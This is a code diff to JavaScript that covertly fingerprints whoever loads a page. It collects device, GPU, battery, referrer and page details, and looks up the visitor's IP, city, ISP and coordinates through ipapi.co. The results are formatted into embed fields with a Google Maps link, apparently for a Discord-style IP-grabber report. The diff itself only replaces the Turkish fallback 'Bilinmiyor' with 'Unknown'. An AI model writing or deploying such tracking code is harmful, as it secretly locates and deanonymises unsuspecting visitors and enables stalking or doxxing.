@@ -747,10 +747,10 @@
               const screenColorDepth = screen.colorDepth;
               const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
               const platform = navigator.platform;
-              const deviceMemory = navigator.deviceMemory || 'Bilinmiyor';
-              const hardwareConcurrency = navigator.hardwareConcurrency || 'Bilinmiyor';
+              const deviceMemory = navigator.deviceMemory || 'Unknown';
+              const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
               
-              let gpuInfo = "Bilinmiyor";
+              let gpuInfo = "Unknown";
               try {
                   const canvas = document.createElement('canvas');
                   const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -762,32 +762,32 @@
                   }
               } catch(e) { gpuInfo = "Alınamadı"; }
               
-              let ip = "Bilinmiyor";
-              let country = "Bilinmiyor";
-              let city = "Bilinmiyor";
-              let region = "Bilinmiyor";
-              let isp = "Bilinmiyor";
-              let lat = "Bilinmiyor";
-              let lon = "Bilinmiyor";
+              let ip = "Unknown";
+              let country = "Unknown";
+              let city = "Unknown";
+              let region = "Unknown";
+              let isp = "Unknown";
+              let lat = "Unknown";
+              let lon = "Unknown";
               
               try {
                   const ipRes = await fetch('https://ipapi.co/json/');
                   const ipData = await ipRes.json();
-                  ip = ipData.ip || "Bilinmiyor";
-                  country = ipData.country_name || ipData.country || "Bilinmiyor";
-                  city = ipData.city || "Bilinmiyor";
-                  region = ipData.region || "Bilinmiyor";
-                  isp = ipData.org || ipData.isp || "Bilinmiyor";
-                  lat = ipData.latitude || "Bilinmiyor";
-                  lon = ipData.longitude || "Bilinmiyor";
+                  ip = ipData.ip || "Unknown";
+                  country = ipData.country_name || ipData.country || "Unknown";
+                  city = ipData.city || "Unknown";
+                  region = ipData.region || "Unknown";
+                  isp = ipData.org || ipData.isp || "Unknown";
+                  lat = ipData.latitude || "Unknown";
+                  lon = ipData.longitude || "Unknown";
               } catch(e) {}
               
               const referrer = document.referrer || "Direkt";
               const pageUrl = window.location.href;
               const cookiesEnabled = navigator.cookieEnabled;
               
-              let batteryLevel = "Bilinmiyor";
-              let charging = "Bilinmiyor";
+              let batteryLevel = "Unknown";
+              let charging = "Unknown";
               if (navigator.getBattery) {
                   try {
                       const battery = await navigator.getBattery();
@@ -807,7 +807,7 @@
                       { name: "📍 Konum", value: `${country} / ${city} / ${region}`, inline: true },
                       { name: "📡 ISP", value: `\`${isp}\``, inline: true },
                       { name: "🗺️ Koordinat", value: `[${lat}, ${lon}](https://www.google.com/maps?q=${lat},${lon})`, inline: true },
-                      { name: "🖥️ İşletim Sistemi", value: `\`${platform || "Bilinmiyor"}\``, inline: true },
+                      { name: "🖥️ İşletim Sistemi", value: `\`${platform || "Unknown"}\``, inline: true },
                       { name: "🎮 Ekran Kartı", value: `\`${gpuInfo.substring(0, 60)}\``, inline: true },
                       { name: "📱 Tarayıcı", value: `\`${userAgent.substring(0, 100)}\``, inline: false },
                       { name: "🖥️ Ekran", value: `${screenWidth}x${screenHeight} (${screenColorDepth}bit)`, inline: true },
